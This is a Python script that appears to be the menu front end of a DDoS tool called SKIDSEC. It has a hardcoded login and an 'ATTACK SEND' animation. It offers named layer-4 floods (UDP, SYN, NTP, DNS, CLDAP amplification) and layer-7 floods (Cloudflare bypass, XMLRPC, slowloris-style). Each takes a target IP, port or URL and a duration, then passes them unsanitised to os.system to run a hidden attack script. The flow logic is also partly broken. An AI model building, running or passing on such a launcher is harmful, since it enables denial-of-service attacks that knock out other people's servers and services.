#!/usr/bin/python3
#coded by $ watermelon
#smd
#import requests
import socket
import time
import sys
import ssl
import datetime
import os
from os import system

print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'SAMPNUDOS123' and password == 'SAMPNUDOS123':
        print('You have successfully logged in Welcome to NUDOS!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
time.sleep(2)
print("Loading.......")

def rocket():
    import time


    rocket = [
        "       _\n",
        "      /^\\\n",
        "     //^\\\\\n",
        "    // ^ \\\\\n",
        "   //  /\\ \\\\\n",
        "  //   || \\\\\n",
        " //    ||  \\\\\n",
        "       ||\n",
        "       ||\n",
        "       ||\n",
        "     //||\\\\\n",
        "    // || \\\\\n",
        "   //  ||  \\\\\n",
        "  //   ||   \\\\\n",
        " //    ||    \\\\\n",
        " ATTACK  SEND !!!  ",
    ]


    red = "\033[91m"
    reset = "\033[0m"
    speed = 0.1

   
    for i in range(len(rocket)):
       
        print(red + "".join(rocket) + reset)

        
        time.sleep(speed)

        
        print("\033c")

       
        rocket.pop(0)
        rocket.append(" " * len(rocket[-1]))


os.system("clear")
print(""" \u001b[35m
        ╔═╗╦╔═╦╔╦╗╔═╗╔═╗╔═╗  ╦  ╦╦╦
        ╚═╗╠╩╗║ ║║╚═╗║╣ ║    ╚╗╔╝║║
        ╚═╝╩ ╩╩═╩╝╚═╝╚═╝╚═╝   ╚╝o╩╩ Version 2.3
         Cod3d By Skidsec Philippines
              CMD layer7,layer4
""")
input1 = input("""
╔══════[root@SKIDSEC]
╚═══> """)

#layer4
if input1 == "layer4":
    print("""  
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                       Methods:                        ║
║ MINECRAFT, CLDAP, VSE, MCPE, NTP, FIVEM, ARD, MEM,    ║
║ DNS, UDP, SYN, CONNECTION, RDP, TCP, TS3, MCBOT, CPS, ║
║ CHAR.                                                 ║                   
║                                                       ║
╚═══════════════════════════════════════════════════════╝""")
    
    layer4input = input("""
╔══════[root@SKIDSEC]
╚═══> """)
    if layer4input == "MINECRAFT":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py MINECRAFT " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
        

    if layer4input == "CLDAP":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py CLDAP " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
       

    if layer4input == "VSE":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py VSE " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
        

    if layer4input == "MCPE":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py MCPE " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
       

    if layer4input == "NTP":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py NTP " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
      

    if layer4input == "FIVEM":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py FIVEM " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
        

    if layer4input == "ARD":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py ARD " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")
        

    if layer4input == "MEM":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py MEM " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "DNS":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py DNS " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "UDP":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py UDP " + ip + ":" + port + " 1000 " + timeudp)
        

    if layer4input == "SYN":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py SYN " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "CONNECTION":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py CONNECTION " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "RDP":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py RDP " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "TCP":
        iptcp = input(f"ip ═ ")
        porttcp = input(f"port ═ ")
        timeudptcp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py TCP " + iptcp + ":" + porttcp + " 1000 " + timeudptcp + " 5 " + "no_proxy.txt")


    if layer4input == "TS3":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py TS3 " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "MCBOT":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py MCBOT " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "CPS":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py CPS " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")


    if layer4input == "CHAR":
        ip = input(f"ip ═ ")
        port = input(f"port ═ ")
        timeudp = input(f"time ═ ")
        rocket()
        os.system("cd files/dont_look && python3 start.py CHAR " + ip + ":" + port + " 1000 " + timeudp + " 5 " + "no_proxy.txt")

#layer7
if input1 == "layer7":
       print("""  
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                       Methods:                        ║ 
║  SLOW, DOWNLOADER, BYPASS, DYN, PPS, HEAD, APACHE,    ║
║  KILLER, CFB, COOKIE, BOMB, EVEN, TOR, DGB, NULL,     ║
║ OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB ║                                            
║                                                       ║
╚═══════════════════════════════════════════════════════╝""")
else:
    layer7input = input("""
╔══════[root@SKIDSEC]
╚═══> """)

layer7input = input("""
╔══════[root@SKIDSEC]
╚═══> """)


if layer7input == "SLOW":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py SLOW " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "DOWNLOADER":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py DOWNLOADER " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)

    
if layer7input == "BYPASS":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py BYPASS " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "DYN":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py DYN " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "PPS":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py PPS " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "HEAD":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py HEAD " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "APACHE":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py APACHE " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "KILLER":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py KILLER " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "CFB":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py CFB " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "COOKIE":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py COOKIE " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "BOMB":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py BOMB " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "EVEN":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py EVEN " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "TOR":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py TOR " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "DGB":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py DGB " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "NULL":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py NULL " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "OVH":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py OVH " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "AVB":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py AVB " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "POST":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py POST " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "XMLRPC":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py XMLRPC " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "GET":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py GET " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)



if layer7input == "CFBUAM":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py CFBUAM " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "BOT":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py BOT " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "STRESS":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py STRESS " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)


if layer7input == "GSB":
    url = input(f"url ═ ")
    timeudp = input(f"time ═ ")
    rocket()
    os.system("cd files/dont_look && python3 start.py GSB " + url + " 5 " + " 1000 " + "no_proxy.txt" + " 123 " + timeudp)
